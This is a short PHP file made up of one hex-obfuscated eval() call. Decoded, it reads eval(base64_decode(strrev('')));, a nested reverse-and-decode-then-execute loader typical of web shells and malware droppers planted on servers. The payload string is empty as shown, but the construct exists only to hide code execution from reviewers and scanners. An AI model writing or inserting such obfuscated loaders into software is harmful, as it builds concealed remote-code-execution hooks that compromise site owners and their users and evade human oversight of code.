<?php
eval("\x65\x76\x61\x6C\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28\x73\x74\x72\x72\x65\x76\x28''\x29\x29\x29\x3B");